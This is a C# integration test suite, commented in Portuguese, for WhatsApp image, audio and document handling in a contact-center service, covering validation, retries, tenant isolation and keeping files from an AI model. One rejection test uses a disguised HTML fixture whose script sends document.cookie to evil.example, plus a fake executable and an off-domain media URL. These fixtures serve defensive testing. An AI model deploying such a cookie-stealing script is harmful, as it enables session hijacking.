using System.Net;
using System.Text;
using System.Text.Json.Nodes;
using IaBimeta.Identity.Domain;
using IaBimeta.IntegrationTests.Agents;
using IaBimeta.Tenancy.Contracts;
using IaBimeta.Tenancy.Contracts.Queries;
using Microsoft.Extensions.DependencyInjection;

namespace IaBimeta.IntegrationTests.Api;

/// <summary>
/// As mensagens de mídia do WhatsApp (imagem, áudio e documento) de ponta a ponta, por HTTP de verdade (ADR 0028): a "Meta" avisa o Receiver pelo webhook assinado, o Worker busca o arquivo na Graph API simulada com o token
/// da conta só nos cabeçalhos, o Conversations valida e guarda em pasta privada, e o atendente vê o estado no histórico e abre o arquivo pelo Api. Nenhuma credencial é real, e nenhum arquivo vai a um provedor de IA.
/// </summary>
[Collection(PostgresCollection.Name)]
public sealed class MidiaDoWhatsAppTests(PostgresFixture banco)
{
    private const string Cliente = "5511999990001";
    private const string OutroCliente = "5511999990002";

    private static readonly byte[] Png = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0, 0, 0, 13, 0x49, 0x48, 0x44, 0x52, 0, 0, 0, 1, 0, 0, 0, 1, 8, 6, 0, 0, 0, 0x1F, 0x15, 0xC4, 0x89];
    private static readonly byte[] Ogg = [.. "OggS"u8, 0, 2, 0, 0, 0, 0, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8];
    private static readonly byte[] Pdf = Encoding.ASCII.GetBytes("%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n");

    private static Func<CapturaHttp, CancellationToken, Task<HttpResponseMessage>> Transfere(string motivo) =>
        (_, _) => Task.FromResult(ServidorOpenAiSimulado.Sucesso(CenarioDeAgentes.Transferir(motivo), 150, 0, 15, "req_midia"));

    private static Func<CapturaHttp, CancellationToken, Task<HttpResponseMessage>> RespondeIndevidamente() =>
        (_, _) => Task.FromResult(ServidorOpenAiSimulado.Sucesso(CenarioDeAgentes.Responder("RESPOSTA QUE NAO DEVERIA EXISTIR"), 150, 0, 25, "req_midia"));

    private sealed record Arquivo(HttpStatusCode Status, byte[] Bytes, IReadOnlyDictionary<string, string> Cabecalhos);

    /// <summary>O ensaio com a pasta de arquivos própria (a MESMA para o Api e o Worker) e as esperas de mídia do Agents curtas.</summary>
    private async Task<EnsaioDeWhatsApp> IniciarAsync(string prefixo, Dictionary<string, string?>? extra = null)
    {
        var configuracao = new Dictionary<string, string?>
        {
            ["Conversations:Attachments:RootPath"] = Path.Combine(banco.PastaDeAnexos, prefixo),
            ["Agents:Options:AudioExtraWait"] = "00:00:01",
            ["Agents:Options:ImageExtraWait"] = "00:00:01",
            ["Agents:Options:DocumentExtraWait"] = "00:00:01",
            ["Agents:Options:ContentRecheck"] = "00:00:00.500",
        };
        foreach (var (chave, valor) in extra ?? new Dictionary<string, string?>())
        {
            configuracao[chave] = valor;
        }

        var e = await EnsaioDeWhatsApp.IniciarAsync(banco, prefixo, configuracao);
        await e.Ia.CadastrarChaveAsync();
        return e;
    }

    private static async Task<string> ItemDaSessaoAsync(EnsaioDeWhatsApp e, string token, Guid sessao)
    {
        string? itemId = null;
        await e.EsperarAsync(
            async () =>
            {
                var itens = await e.Ia.Api.LerAsync<JsonNode>(token, "/contact-center/items?status=Waiting&take=50");
                var item = itens.AsArray().FirstOrDefault(i => i!["sessionId"]!.GetValue<Guid>() == sessao);
                itemId = item?["pending"] is null ? item?["id"]?.GetValue<string>() : null;
                return itemId is not null;
            },
            "a conversa deveria estar esperando na fila");
        return itemId!;
    }

    /// <summary>Uma conversa que a IA transferiu e o atendente assumiu: é o estado em que o cliente manda a mídia e o atendente a vê.</summary>
    private async Task<(string Token, string ItemId, Guid Sessao)> ConversaAssumidaAsync(EnsaioDeWhatsApp e, string waId = Cliente, string nome = "Mauro")
    {
        e.Ia.OpenAi.Roteiros.Definir(EnsaioDeIa.ChaveCanario, Transfere("price"));
        var (_, token) = await e.NovoAtendenteAsync();
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeTexto($"wamid.INI{Guid.NewGuid():N}"[..20], waId, nome, "Quanto custa o hemograma?")));
        var sessao = await e.EsperarSessaoAsync(nome);
        var itemId = await ItemDaSessaoAsync(e, token, sessao);
        Assert.Equal(HttpStatusCode.OK, await e.Ia.Api.StatusAsync(token, HttpMethod.Post, $"/contact-center/items/{itemId}/claim", new { requestId = Guid.NewGuid() }));

        // O aviso da transferência já saiu pelo WhatsApp: o que sai depois disso é o que a mídia provocar.
        await e.EsperarAsync(async () => e.Graph.Capturas.Count == 1, "o aviso da transferência deveria sair pelo WhatsApp");
        return (token, itemId, sessao);
    }

    private static async Task<IReadOnlyList<JsonNode>> MensagensAsync(EnsaioDeWhatsApp e, string token, string itemId) =>
        (await e.Ia.Api.LerAsync<JsonNode>(token, $"/contact-center/items/{itemId}/messages?take=100"))["items"]!.AsArray().Select(m => m!).ToList();

    private static async Task<JsonNode?> AnexoDaMensagemAsync(EnsaioDeWhatsApp e, string token, string itemId, string messageId) =>
        (await MensagensAsync(e, token, itemId)).Single(m => m["id"]!.GetValue<string>() == messageId)["attachment"];

    /// <summary>O identificador da mensagem de mídia (a mais recente do cliente com arquivo) cujo identificador do provedor é o informado: o histórico não o mostra, então acha pela legenda ou pela ordem.</summary>
    private static async Task<string> IdDaMensagemComAnexoAsync(EnsaioDeWhatsApp e, string token, string itemId, int ordem)
    {
        string? id = null;
        await e.EsperarAsync(
            async () =>
            {
                var comAnexo = (await MensagensAsync(e, token, itemId)).Where(m => m["attachment"] is not null).ToList();
                id = comAnexo.Count > ordem ? comAnexo[ordem]["id"]!.GetValue<string>() : null;
                return id is not null;
            },
            $"a mensagem de mídia {ordem} deveria estar no histórico");
        return id!;
    }

    private static async Task EsperarEstadoAsync(EnsaioDeWhatsApp e, string token, string itemId, string messageId, string estado, int segundos = 40) =>
        await EnsaioDeIa.AguardarAsync(
            async () => (await AnexoDaMensagemAsync(e, token, itemId, messageId))?["status"]?.GetValue<string>() == estado,
            $"o arquivo da mensagem deveria ficar em {estado}",
            segundos);

    private static async Task<Arquivo> BaixarAsync(EnsaioDeWhatsApp e, string? token, string itemId, string messageId)
    {
        using var pedido = e.Ia.Api.RequisicaoDe(token, HttpMethod.Get, $"/contact-center/items/{itemId}/messages/{messageId}/attachment");
        using var resposta = await e.Ia.Api.Client.SendAsync(pedido);
        var cabecalhos = resposta.Headers.Concat(resposta.Content.Headers).ToDictionary(h => h.Key, h => string.Join(",", h.Value), StringComparer.OrdinalIgnoreCase);
        return new Arquivo(resposta.StatusCode, await resposta.Content.ReadAsByteArrayAsync(), cabecalhos);
    }

    private async Task<int> ObjetosGuardadosAsync(EnsaioDeWhatsApp e, string prefixo)
    {
        var pasta = Path.Combine(banco.PastaDeAnexos, prefixo);
        await Task.CompletedTask;
        return Directory.Exists(pasta) ? Directory.EnumerateFiles(pasta, "*.bin", SearchOption.AllDirectories).Count() : 0;
    }

    // O caminho feliz

    [Fact]
    public async Task Imagem_audio_e_documento_chegam_pelo_webhook_sao_baixados_e_o_atendente_os_ve_e_abre_com_os_mesmos_bytes()
    {
        await using var e = await IniciarAsync("midiaok");
        var (token, itemId, _) = await ConversaAssumidaAsync(e);
        var modeloAntes = e.Ia.OpenAi.Roteiros.Capturas.Count;
        var enviosAntes = e.Graph.Capturas.Count;

        var imagem = e.Graph.RegistrarMidia("1001001", Png, "image/png");
        var audio = e.Graph.RegistrarMidia("1001002", Ogg, "audio/ogg; codecs=opus");
        var documento = e.Graph.RegistrarMidia("1001003", Pdf, "application/pdf");

        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("image", "wamid.MID0001", Cliente, "Mauro", "1001001", "image/png", legenda: "Foto da requisição")));
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("audio", "wamid.MID0002", Cliente, "Mauro", "1001002", "audio/ogg; codecs=opus", voz: true)));
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("document", "wamid.MID0003", Cliente, "Mauro", "1001003", "application/pdf", legenda: "Laudo anterior", nomeDoArquivo: "laudo anterior.pdf")));

        var idImagem = await IdDaMensagemComAnexoAsync(e, token, itemId, 0);
        var idAudio = await IdDaMensagemComAnexoAsync(e, token, itemId, 1);
        var idDocumento = await IdDaMensagemComAnexoAsync(e, token, itemId, 2);
        await EsperarEstadoAsync(e, token, itemId, idImagem, "Available");
        await EsperarEstadoAsync(e, token, itemId, idAudio, "Available");
        await EsperarEstadoAsync(e, token, itemId, idDocumento, "Available");

        // O histórico: tipo verificado, nome saneado, tamanho e legenda; nada de caminho, identificador do provedor ou URL.
        var visaoImagem = (await AnexoDaMensagemAsync(e, token, itemId, idImagem))!;
        Assert.Equal("image/png", visaoImagem["mimeType"]!.GetValue<string>());
        Assert.Equal("arquivo.png", visaoImagem["fileName"]!.GetValue<string>());
        Assert.Equal(Png.Length, visaoImagem["sizeBytes"]!.GetValue<int>());
        Assert.Equal("Foto da requisição", visaoImagem["caption"]!.GetValue<string>());
        var visaoAudio = (await AnexoDaMensagemAsync(e, token, itemId, idAudio))!;
        Assert.Equal("audio/ogg", visaoAudio["mimeType"]!.GetValue<string>());
        var visaoDocumento = (await AnexoDaMensagemAsync(e, token, itemId, idDocumento))!;
        Assert.Equal("laudo anterior.pdf", visaoDocumento["fileName"]!.GetValue<string>());
        var json = (await e.Ia.Api.LerAsync<JsonNode>(token, $"/contact-center/items/{itemId}/messages?take=100")).ToJsonString();
        Assert.DoesNotContain("1001001", json, StringComparison.Ordinal);
        Assert.DoesNotContain("storage", json, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("/media-content/", json, StringComparison.Ordinal);

        // O arquivo: os mesmos bytes, o tipo VERIFICADO e a entrega que o navegador não executa (imagem e áudio inline, o resto como download).
        var baixadaImagem = await BaixarAsync(e, token, itemId, idImagem);
        Assert.Equal(HttpStatusCode.OK, baixadaImagem.Status);
        Assert.Equal(Png, baixadaImagem.Bytes);
        Assert.Equal("image/png", baixadaImagem.Cabecalhos["Content-Type"]);
        Assert.StartsWith("inline", baixadaImagem.Cabecalhos["Content-Disposition"], StringComparison.Ordinal);
        Assert.Equal("nosniff", baixadaImagem.Cabecalhos["X-Content-Type-Options"]);
        Assert.Contains("sandbox", baixadaImagem.Cabecalhos["Content-Security-Policy"], StringComparison.Ordinal);
        Assert.Contains("no-store", baixadaImagem.Cabecalhos["Cache-Control"], StringComparison.Ordinal);

        var baixadoAudio = await BaixarAsync(e, token, itemId, idAudio);
        Assert.Equal((HttpStatusCode.OK, "audio/ogg"), (baixadoAudio.Status, baixadoAudio.Cabecalhos["Content-Type"]));
        Assert.Equal(Ogg, baixadoAudio.Bytes);
        Assert.StartsWith("inline", baixadoAudio.Cabecalhos["Content-Disposition"], StringComparison.Ordinal);

        var baixadoDocumento = await BaixarAsync(e, token, itemId, idDocumento);
        Assert.Equal(Pdf, baixadoDocumento.Bytes);
        Assert.StartsWith("attachment", baixadoDocumento.Cabecalhos["Content-Disposition"], StringComparison.Ordinal);
        Assert.Contains("laudo", baixadoDocumento.Cabecalhos["Content-Disposition"], StringComparison.Ordinal);

        // A Meta foi chamada UMA vez por etapa e por arquivo, sempre com o token da conta no cabeçalho (nunca na URL).
        foreach (var midia in new[] { imagem, audio, documento })
        {
            Assert.Equal((1, 1), (midia.Consultas, midia.Downloads));
            Assert.All(midia.CredenciaisDaConsulta.Concat(midia.CredenciaisDoConteudo), c => Assert.Equal(EnsaioDeWhatsApp.TokenDeAcesso, c));
        }

        // Nenhum arquivo, nem texto dele, foi a um modelo de IA, e a mídia não provocou resposta automática ao cliente (a conversa é do atendente).
        await Task.Delay(TimeSpan.FromSeconds(1.5));
        Assert.Equal(modeloAntes, e.Ia.OpenAi.Roteiros.Capturas.Count);
        Assert.Equal(enviosAntes, e.Graph.Capturas.Count);

        // O token da conta nunca foi para um log, e o conteúdo do arquivo também não.
        Assert.DoesNotContain(e.Ia.Logs.Linhas, l => l.Contains(EnsaioDeWhatsApp.TokenDeAcesso, StringComparison.Ordinal));
        Assert.DoesNotContain(e.Ia.Logs.Linhas, l => l.Contains("1001001", StringComparison.Ordinal) && l.Contains("media-content", StringComparison.Ordinal) && l.Contains("hash=", StringComparison.Ordinal));
    }

    [Fact]
    public async Task O_mesmo_webhook_repetido_nao_cria_outro_arquivo_nem_baixa_de_novo()
    {
        await using var e = await IniciarAsync("midiadup");
        var (token, itemId, _) = await ConversaAssumidaAsync(e);
        var midia = e.Graph.RegistrarMidia("2002001", Png, "image/png");
        var corpo = e.PayloadDeMidia("image", "wamid.DUP0001", Cliente, "Mauro", "2002001", "image/png");

        for (var i = 0; i < 3; i++)
        {
            Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(corpo));
        }

        var id = await IdDaMensagemComAnexoAsync(e, token, itemId, 0);
        await EsperarEstadoAsync(e, token, itemId, id, "Available");

        // Repetir DEPOIS de concluído também não faz nada de novo.
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(corpo));
        await Task.Delay(TimeSpan.FromSeconds(2));

        Assert.Single(await MensagensAsync(e, token, itemId), m => m["attachment"] is not null);
        Assert.Equal((1, 1), (midia.Consultas, midia.Downloads));
        Assert.Equal(1, await ObjetosGuardadosAsync(e, "midiadup"));
    }

    // Arquivos que não valem

    [Fact]
    public async Task Arquivo_invalido_grande_demais_expirado_ou_adulterado_nunca_e_guardado_nem_aberto_e_o_atendente_ve_o_motivo()
    {
        await using var e = await IniciarAsync("midiabad", new Dictionary<string, string?> { ["Conversations:Attachments:MaxImageBytes"] = "2048" });
        var (token, itemId, _) = await ConversaAssumidaAsync(e);

        var html = Encoding.UTF8.GetBytes("<html><script>fetch('http://evil.example/?c='+document.cookie)</script></html>");
        var casos = new (string Id, string Msg, byte[] Conteudo, string Mime, Action<MidiaDaMeta> Configura, string Tipo, string Estado, string Motivo)[]
        {
            ("3003001", "wamid.BAD0001", html, "image/png", _ => { }, "image", "Rejected", "content-mismatch"),
            ("3003002", "wamid.BAD0002", new byte[4000], "image/png", m => m.TamanhoDeclarado = 4000, "image", "Rejected", "too-large"),
            ("3003003", "wamid.BAD0003", Png, "image/png", m => m.StatusDaConsulta = 404, "image", "Unavailable", "expired"),
            ("3003004", "wamid.BAD0004", Pdf, "application/pdf", m => m.Sha256 = new string('0', 64), "document", "Rejected", "hash-mismatch"),
            ("3003005", "wamid.BAD0005", [0x4D, 0x5A, 0x90, 0x00, 3, 0, 0, 0], "application/x-msdownload", _ => { }, "document", "Rejected", "type-not-allowed"),
            ("3003006", "wamid.BAD0006", [0x4D, 0x5A, 0x90, 0x00, 3, 0, 0, 0], "application/pdf", _ => { }, "document", "Rejected", "content-mismatch"),
            ("3003007", "wamid.BAD0007", Png, "image/png", m => m.EnderecoDoConteudo = "https://evil.example.com/arquivo", "image", "Unavailable", "media-url-not-allowed"),
        };

        var midias = new List<MidiaDaMeta>();
        foreach (var caso in casos)
        {
            var midia = e.Graph.RegistrarMidia(caso.Id, caso.Conteudo, caso.Mime);
            caso.Configura(midia);
            midias.Add(midia);
            Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia(caso.Tipo, caso.Msg, Cliente, "Mauro", caso.Id, caso.Mime)));
        }

        for (var i = 0; i < casos.Length; i++)
        {
            var id = await IdDaMensagemComAnexoAsync(e, token, itemId, i);
            await EsperarEstadoAsync(e, token, itemId, id, casos[i].Estado);
            var visao = (await AnexoDaMensagemAsync(e, token, itemId, id))!;
            Assert.Equal(casos[i].Motivo, visao["failureCode"]!.GetValue<string>());
            Assert.Null(visao["mimeType"]);
            Assert.Null(visao["sizeBytes"]);

            // Nada para abrir: o arquivo não existe para o atendente.
            Assert.Equal(HttpStatusCode.NotFound, (await BaixarAsync(e, token, itemId, id)).Status);
        }

        // Nada foi guardado, e o conteúdo grande demais nem foi baixado (a consulta já informou o tamanho); o endereço de fora nunca recebeu o token.
        Assert.Equal(0, await ObjetosGuardadosAsync(e, "midiabad"));
        Assert.Equal(0, midias[1].Downloads);
        Assert.Equal(0, midias[2].Downloads);
        Assert.Equal(0, midias[6].Downloads);
        Assert.Equal(1, midias[0].Downloads);
    }

    // Falhas do provedor

    [Fact]
    public async Task Falha_passageira_do_provedor_repete_com_espera_e_depois_conclui_sem_duplicar()
    {
        await using var e = await IniciarAsync("midiaretry");
        var (token, itemId, _) = await ConversaAssumidaAsync(e);
        var midia = e.Graph.RegistrarMidia("4004001", Png, "image/png");
        midia.FalhasPassageirasDoConteudo = 2;

        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("image", "wamid.RET0001", Cliente, "Mauro", "4004001", "image/png")));
        var id = await IdDaMensagemComAnexoAsync(e, token, itemId, 0);

        // Enquanto repete, o atendente vê "processando", nunca um arquivo pela metade.
        await EsperarEstadoAsync(e, token, itemId, id, "Available", segundos: 60);
        Assert.Equal(3, midia.Downloads);
        Assert.Equal(3, midia.Consultas);
        Assert.Equal(Png, (await BaixarAsync(e, token, itemId, id)).Bytes);
        Assert.Equal(1, await ObjetosGuardadosAsync(e, "midiaretry"));
    }

    [Fact]
    public async Task Falha_persistente_esgota_as_tentativas_e_o_arquivo_fica_indisponivel_nunca_processando_para_sempre()
    {
        await using var e = await IniciarAsync("midiamorto", new Dictionary<string, string?>
        {
            ["Messaging:MaxAttempts"] = "3",
            ["Messaging:BaseBackoff"] = "00:00:00.200",
            ["Messaging:MaxBackoff"] = "00:00:00.400",
            ["Messaging:DeadLetterSweepInterval"] = "00:00:01",
        });
        var (token, itemId, _) = await ConversaAssumidaAsync(e);
        var midia = e.Graph.RegistrarMidia("5005001", Png, "image/png");
        midia.StatusDoConteudo = 500;

        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("image", "wamid.MOR0001", Cliente, "Mauro", "5005001", "image/png")));
        var id = await IdDaMensagemComAnexoAsync(e, token, itemId, 0);

        await EsperarEstadoAsync(e, token, itemId, id, "Unavailable", segundos: 60);
        var visao = (await AnexoDaMensagemAsync(e, token, itemId, id))!;
        Assert.Equal("download-failed", visao["failureCode"]!.GetValue<string>());
        Assert.Equal(HttpStatusCode.NotFound, (await BaixarAsync(e, token, itemId, id)).Status);
        Assert.Equal(3, midia.Downloads);
    }

    [Fact]
    public async Task Worker_que_cai_no_meio_do_download_o_novo_conclui_o_arquivo_uma_unica_vez()
    {
        await using var e = await IniciarAsync("midiareinicio", new Dictionary<string, string?> { ["Messaging:LeaseDuration"] = "00:00:03" });
        var (token, itemId, _) = await ConversaAssumidaAsync(e);
        var midia = e.Graph.RegistrarMidia("6006001", Png, "image/png");

        // A Meta recebe o pedido do conteúdo e o segura: o Worker cai com o download em andamento.
        midia.AntesDoConteudo = ct => Task.Delay(Timeout.Infinite, ct);
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("image", "wamid.REI0001", Cliente, "Mauro", "6006001", "image/png")));
        await e.EsperarAsync(async () => midia.Downloads == 1, "o download deveria estar em andamento na Meta");
        var id = await IdDaMensagemComAnexoAsync(e, token, itemId, 0);
        Assert.Equal("Pending", (await AnexoDaMensagemAsync(e, token, itemId, id))!["status"]!.GetValue<string>());

        midia.AntesDoConteudo = null;
        await e.Ia.ReiniciarWorkerAsync();

        // O novo Worker acha o evento com o lease vencido e conclui: um arquivo, um objeto, nenhuma duplicata.
        await EsperarEstadoAsync(e, token, itemId, id, "Available", segundos: 60);
        Assert.Equal(Png, (await BaixarAsync(e, token, itemId, id)).Bytes);
        await Task.Delay(TimeSpan.FromSeconds(2));
        Assert.Equal(1, await ObjetosGuardadosAsync(e, "midiareinicio"));
        Assert.Single(await MensagensAsync(e, token, itemId), m => m["attachment"] is not null);
        Assert.Equal("Available", (await AnexoDaMensagemAsync(e, token, itemId, id))!["status"]!.GetValue<string>());
    }

    // Isolamento e autorização

    [Fact]
    public async Task Outra_empresa_outro_usuario_e_o_visitante_sem_login_nunca_abrem_o_arquivo()
    {
        await using var e = await IniciarAsync("midiaiso");
        var (token, itemId, _) = await ConversaAssumidaAsync(e);
        e.Graph.RegistrarMidia("7007001", Png, "image/png");
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("image", "wamid.ISO0001", Cliente, "Mauro", "7007001", "image/png")));
        var id = await IdDaMensagemComAnexoAsync(e, token, itemId, 0);
        await EsperarEstadoAsync(e, token, itemId, id, "Available");

        // Sem login: não autenticado. Com login de OUTRA empresa: o atendimento não existe para ela.
        Assert.Equal(HttpStatusCode.Unauthorized, (await BaixarAsync(e, null, itemId, id)).Status);
        var outraEmpresa = await banco.RegistrarTenantAsync("midiaisob");
        var organizacaoB = await banco.CriarOrganizacaoAsync(outraEmpresa, "Outra empresa");
        var usuarioB = await banco.CriarUsuarioAsync(outraEmpresa, organizacaoB.Id, Role.OrganizationAdmin);
        var tokenB = await e.Ia.Api.LoginAsync(usuarioB);
        var deOutraEmpresa = await BaixarAsync(e, tokenB, itemId, id);
        Assert.Contains(deOutraEmpresa.Status, new[] { HttpStatusCode.NotFound, HttpStatusCode.Forbidden });
        var corpoDeOutraEmpresa = Encoding.Latin1.GetString(deOutraEmpresa.Bytes);
        Assert.True(!corpoDeOutraEmpresa.Contains("PNG", StringComparison.Ordinal), $"status={deOutraEmpresa.Status} corpo={corpoDeOutraEmpresa}");

        // A mensagem com o identificador de outra mensagem do mesmo atendimento, ou um inexistente: 404.
        Assert.Equal(HttpStatusCode.NotFound, (await BaixarAsync(e, token, itemId, Guid.NewGuid().ToString())).Status);
        var primeiraMensagem = (await MensagensAsync(e, token, itemId)).First(m => m["attachment"] is null)["id"]!.GetValue<string>();
        Assert.Equal(HttpStatusCode.NotFound, (await BaixarAsync(e, token, itemId, primeiraMensagem)).Status);

        // Um usuário da mesma empresa que NÃO é da organização do atendimento também não abre.
        var empresa = await EmpresaDoEnsaioAsync(e);
        var outraOrganizacao = await banco.CriarOrganizacaoAsync(empresa, "Outra organização do ensaio");
        var estranho = await banco.CriarUsuarioAsync(empresa, outraOrganizacao.Id, Role.User);
        var tokenEstranho = await e.Ia.Api.LoginAsync(estranho);
        Assert.Contains((await BaixarAsync(e, tokenEstranho, itemId, id)).Status, new[] { HttpStatusCode.NotFound, HttpStatusCode.Forbidden });

        // O dono continua abrindo.
        Assert.Equal(Png, (await BaixarAsync(e, token, itemId, id)).Bytes);
    }

    private async Task<TenantInfo> EmpresaDoEnsaioAsync(EnsaioDeWhatsApp e)
    {
        await using var consulta = banco.NovoEscopo();
        return await consulta.ServiceProvider.GetRequiredService<ITenantDirectory>().FindBySlugAsync(e.Ia.Slug) ?? throw new InvalidOperationException("O tenant do ensaio não existe.");
    }

    // A IA nunca recebe arquivo

    [Fact]
    public async Task Cliente_novo_que_manda_imagem_ou_documento_vai_ao_atendente_e_nenhum_arquivo_nem_texto_vai_ao_modelo()
    {
        await using var e = await IniciarAsync("midiaia");
        e.Ia.OpenAi.Roteiros.Definir(EnsaioDeIa.ChaveCanario, RespondeIndevidamente());
        var (_, token) = await e.NovoAtendenteAsync();
        e.Graph.RegistrarMidia("8008001", Png, "image/png");
        e.Graph.RegistrarMidia("8008002", Pdf, "application/pdf");

        // Primeiro contato do cliente: uma imagem com legenda (que um modelo poderia "responder") e, de outro cliente, um documento.
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("image", "wamid.IA00001", Cliente, "Mauro", "8008001", "image/png", legenda: "Quanto custa este exame?")));
        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("document", "wamid.IA00002", OutroCliente, "Pedro", "8008002", "application/pdf", nomeDoArquivo: "pedido.pdf")));
        var sessaoMauro = await e.EsperarSessaoAsync("Mauro");
        var sessaoPedro = await e.EsperarSessaoAsync("Pedro");

        // A política do conteúdo pendente: nem a imagem nem a legenda vão ao modelo; a conversa segue ao atendente com o motivo "conteúdo indisponível para a IA".
        var itemMauro = await ItemDaSessaoAsync(e, token, sessaoMauro);
        var itemPedro = await ItemDaSessaoAsync(e, token, sessaoPedro);
        Assert.Empty(e.Ia.OpenAi.Roteiros.Capturas);
        Assert.DoesNotContain(e.Graph.Capturas, c => c.Texto.Contains("NAO DEVERIA EXISTIR", StringComparison.Ordinal));

        // O atendente assume e VÊ o arquivo (a imagem de Mauro e o documento de Pedro, cada um na sua conversa).
        Assert.Equal(HttpStatusCode.OK, await e.Ia.Api.StatusAsync(token, HttpMethod.Post, $"/contact-center/items/{itemMauro}/claim", new { requestId = Guid.NewGuid() }));
        Assert.Equal(HttpStatusCode.OK, await e.Ia.Api.StatusAsync(token, HttpMethod.Post, $"/contact-center/items/{itemPedro}/claim", new { requestId = Guid.NewGuid() }));
        var idMauro = await IdDaMensagemComAnexoAsync(e, token, itemMauro, 0);
        var idPedro = await IdDaMensagemComAnexoAsync(e, token, itemPedro, 0);
        await EsperarEstadoAsync(e, token, itemMauro, idMauro, "Available");
        await EsperarEstadoAsync(e, token, itemPedro, idPedro, "Available");
        Assert.Equal(Png, (await BaixarAsync(e, token, itemMauro, idMauro)).Bytes);
        Assert.Equal(Pdf, (await BaixarAsync(e, token, itemPedro, idPedro)).Bytes);

        // O arquivo de um cliente nunca aparece na conversa do outro, e o identificador de uma mensagem de OUTRO atendimento não abre nada.
        Assert.Equal(HttpStatusCode.NotFound, (await BaixarAsync(e, token, itemMauro, idPedro)).Status);
        Assert.Equal(HttpStatusCode.NotFound, (await BaixarAsync(e, token, itemPedro, idMauro)).Status);
        Assert.Empty(e.Ia.OpenAi.Roteiros.Capturas);
    }

    [Fact]
    public async Task Audio_de_cliente_novo_nao_vai_ao_modelo_e_o_atendente_ainda_o_reproduz()
    {
        await using var e = await IniciarAsync("midiaaudio");
        e.Ia.OpenAi.Roteiros.Definir(EnsaioDeIa.ChaveCanario, RespondeIndevidamente());
        var (_, token) = await e.NovoAtendenteAsync();
        e.Graph.RegistrarMidia("9009001", Ogg, "audio/ogg; codecs=opus");

        Assert.Equal(HttpStatusCode.OK, await e.EnviarWebhookAsync(e.PayloadDeMidia("audio", "wamid.AUD0001", Cliente, "Mauro", "9009001", "audio/ogg; codecs=opus", voz: true)));
        var sessao = await e.EsperarSessaoAsync("Mauro");

        // Depois da espera do conteúdo (1 s no ensaio), a política do áudio é a resposta informativa aprovada do tenant, ou o atendente quando não há texto aprovado: o modelo NUNCA é chamado.
        await e.EsperarAsync(
            async () => e.Graph.Capturas.Count == 1 || (await e.Ia.Api.LerAsync<JsonNode>(token, "/contact-center/items?status=Waiting&take=50")).AsArray().Any(i => i!["sessionId"]!.GetValue<Guid>() == sessao),
            "o áudio deveria receber a resposta informativa ou seguir ao atendente");
        Assert.Empty(e.Ia.OpenAi.Roteiros.Capturas);
        Assert.DoesNotContain(e.Graph.Capturas, c => c.Texto.Contains("NAO DEVERIA EXISTIR", StringComparison.Ordinal));

        // O arquivo fica disponível ao atendente de qualquer forma (o histórico da sessão tem o anexo do áudio).
        await e.EsperarAsync(
            async () =>
            {
                var historico = await e.Ia.ComoSistemaAsync(sp => sp.GetRequiredService<IaBimeta.Conversations.Contracts.Queries.IConversationQueries>().GetHistoryAsync(new IaBimeta.Conversations.Contracts.Queries.GetHistoryQuery(sessao, 50, null, IaBimeta.Conversations.Contracts.HistoryOrder.OldestFirst)));
                return historico!.Items.Any(m => m.Attachment is { Status: IaBimeta.Conversations.Contracts.AttachmentStatus.Available });
            },
            "o áudio deveria ficar disponível");
    }
}
